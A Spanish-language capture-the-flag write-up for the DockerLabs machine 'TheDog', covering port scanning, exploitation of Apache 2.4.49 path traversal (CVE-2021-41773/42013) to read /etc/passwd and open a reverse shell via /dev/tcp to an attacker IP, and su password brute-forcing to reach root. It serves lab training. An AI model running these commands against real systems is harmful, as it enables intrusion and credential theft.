---
icon: flag
---

# TheDog DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip thedog.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh thedog.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 14:21 EDT
Nmap scan report for bicho.dl (172.17.0.2)
Host is up (0.000072s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-server-header: Apache/2.4.49 (Unix)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Comando Ping
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds
```

Veremos que solo hay un puerto `80`, que aloja una pagina web, si entramos veremos que es una pagina web dedicada a explicar el comando `ping` y puede ser que por ahi vayan los tiros, vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 4688]
/html.html            (Status: 200) [Size: 766]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que nos encuentra un `html.html` que si entramos dentro del archivo veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Vemos lo que puede ser un usuario llamado `punky` y se centra mucho en la herramienta `ping`, vamos a probar a ponernos en escucha en la red sobre trafico `ICMP` que es el que genera al realizar un `ping`.

```shell
tcpdump -i <INTERFAZ_RED> icmp -A
```

Pero no veremos que recibamos nada, por lo que seguiremos buscando.

## Escalate user www-data

### Apache Path Traversal (RCE)

Vamos a ver en que version esta `apache2` ya que estuve un rato buscando pero no encontraba nada, vamos a ver si tuviera alguna version antigua.

```shell
whatweb http://<IP>/
```

Info:

```
http://172.17.0.2/ [200 OK] Apache[2.4.49], Country[RESERVED][ZZ], HTML5, HTTPServer[Unix][Apache/2.4.49 (Unix)], IP[172.17.0.2], Title[Comando Ping]
```

Vemos que la version es `2.4.49` vamos a ver si fuera vulnerable en `ExploitDB`, si buscamod en dicha pagina podremos ver que efectivamente lo es a un `Apache Path Traversal` pero tambien se puede ejecutar codigo de forma remota (`RCE`).

Vamos a descargarnos el siguiente repo de `GitHub` que es con el que me funciono.

URL = [exploit.py Apache Vuln GitHub](https://github.com/battleoverflow/apache-traversal/tree/main)

Una vez que nos hayamos copiado el archivo `exploit.py` vamos a probar a leer el `passwd` ejecutando el script de esta forma:

```shell
python3 exploit.py --cgi --ip <IP_VICTIM> --port 80 --path /etc/passwd -vs
```

Info:

```

        #################################################################
        #                                                               #
        #   CVE-2021-41773 & CVE-2021-42013 | "Apache Path Traversal"   #
        #   Author: battleoverflow                                      #
        #   GitHub: https://github.com/battleoverflow                   #
        #                                                               #
        #################################################################
        

Exploit running with CGI enabled...

[*] Attacking: 172.17.0.2
[*] Port: 80
[*] Path: /etc/passwd

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 172.17.0.2:80...
* Connected to 172.17.0.2 (172.17.0.2) port 80
* using HTTP/1.x
> POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash HTTP/1.1
> Host: 172.17.0.2
> User-Agent: curl/8.12.1
> Accept: */*
> Content-Type: text/plain
> Content-Length: 52
> 
} [52 bytes data]
* upload completely sent off: 52 bytes
< HTTP/1.1 200 OK
< Date: Thu, 15 May 2025 08:00:12 GMT
< Server: Apache/2.4.49 (Unix)
< Transfer-Encoding: chunked
< Content-Type: text/plain
< 
{ [1260 bytes data]

100  1305    0  1253  100    52   298k  12692 --:--:-- --:--:-- --:--:--  318k
* Connection #0 to host 172.17.0.2 left intact
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
punky:x:1001:1001:,,,:/home/punky:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:995:995:systemd Resolver:/:/usr/sbin/nologin
postfix:x:101:103::/var/spool/postfix:/usr/sbin/nologin
```

Vemos que efectivamente ha funcionado, por lo que vamos a probar a ejecutar una `reverse shell` con estos otros parametros del script.

```shell
python3 exploit.py --cgi --ip <IP_VICTIM> --port 80 --cgi -v --rce --cmd "bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT> 0>&1"
```

Antes de enviarlo nos pondremos a la escucha.

```shell
nc -lvnp <PORT>
```

Y ahora si lo enviamos y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 35486
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
www-data@20f0d0246196:/usr/bin$ whoami
whoami
www-data
```

Veremos que ha funcionado, por lo que tendremos que sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user punky

Si listamos los permisos `SUID` que hay.

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
3670487     56 -rwsr-xr-x   1 root     root        55680 Dec  5 12:26 /usr/bin/su
  3670279     72 -rwsr-xr-x   1 root     root        72792 May 31  2024 /usr/bin/chfn
  3670410     40 -rwsr-xr-x   1 root     root        40664 May 31  2024 /usr/bin/newgrp
  3670346     76 -rwsr-xr-x   1 root     root        76248 May 31  2024 /usr/bin/gpasswd
  3670421     64 -rwsr-xr-x   1 root     root        64152 May 31  2024 /usr/bin/passwd
  3670513     40 -rwsr-xr-x   1 root     root        39296 Dec  5 12:26 /usr/bin/umount
  3670405     52 -rwsr-xr-x   1 root     root        51584 Dec  5 12:26 /usr/bin/mount
  3670285     44 -rwsr-xr-x   1 root     root        44760 May 31  2024 /usr/bin/chsh
  3691302     56 -rwsr-sr-x   1 daemon   daemon      55624 Apr  1  2024 /usr/bin/at
  3692100     20 -rwsr-x---   1 root     suidgroup    16712 May 11 08:55 /usr/local/bin/task_manager
  3691371     36 -rwsr-xr--   1 root     messagebus    34960 Aug  9  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Veremos uno interesante que es el siguiente:

```
3692100 20 -rwsr-x--- 1 root suidgroup  16712 May 11 08:55 /usr/local/bin/task_manager
```

Vemos que solamente se podria ejecutar siendo `root` o perteneciendo al grupo `suidgroup` y no pertenecemos a dicho grupo, pero probablemente el usuario `punky` si pertenezca, por lo que vamos a dejarlo para mas tarde.

Ya que no tenemos `curl, wget, ssh` etc... Vamos a pasarnos el `linpeas.sh` copiandolo en nuestro `clipboard` de esta forma desde `kali`.

```shell
xclip -selection clipboard < linpeas.sh
```

Ahora desde la maquina victima:

```shell
cd /tmp
nano linpeas.sh

#Dentro del nano
<PEGAMOS_EL_LINPEAS.SH>
```

Lo guardamos y establecemos permisos de ejecuccion.

```shell
chmod +x linpeas.sh
```

Ahora lo ejecutamos de la siguiente forma:

```shell
./linpeas.sh
```

Veremos cosas interesantes, pero nada util por el momento, vamos a probar a realizar `fuerza bruta` con el usuario `punky` pero en vez de con un diccionario personalizado con el propio `rockyou.txt`.

Desde la maquina `host` haremos esto:

```shell
head -n 500000 /usr/share/wordlists/rockyou.txt | xclip -selection clipboard
```

Ahora en la maquina victima haremos esto:

```shell
cd /tmp
nano rockyou.txt

#Dentro del nano
<PEGAMOS_EL_ROCKYOU_COPIADO>
```

Lo guardamos y utilizamos un script llamado `Su-Force.sh`, y lo vamos a utilizar de esta forma.

URL = [Download Su-Force.sh GitHub](https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh)

```shell
bash Su-Force.sh punky rockyou.txt
```

Info:

```
Contraseña encontrada para el usuario punky: secret
```

Veremos que hemos encontrado la contraseña de dicho usuario llamada `secret` por lo que vamos a escalar a el.

```shell
su punky
```

Metemos como contraseña `secret` y veremos que seremos dicho usuario.

## Privilege Escalation

Si vemos a que grupo pertenecemos.

```shell
id
```

Info:

```
uid=1001(punky) gid=1001(punky) groups=1001(punky),100(users),1002(suidgroup)
```

Veremos que pertenecemos al grupo `suidgroup` justo uno de los permisos `SUID` que hemos visto antes, que seria de este binario.

```
/usr/local/bin/task_manager
```

Por lo que vamos a investigar que hace dicho binario.

Pero despues de un rato no encontraremos nada, por lo que no nos queda otra que probar fuerza bruta con el usuario `root` de la misma forma que hicimos con el anterior usuario.

```shell
cd /tmp
bash Su-Force.sh root rockyou.txt
```

Info:

```
Contraseña encontrada para el usuario root: hannah
```

Veremos que ha funcionado, vamos a escalar a `root`.

```shell
su root
```

Metemos como contraseña `hannah` y veremos que seremos dicho usuario.

Info:

```
root@6cb5977c3ce1:~# whoami
root
```

Con esto ya habremos terminado la maquina.
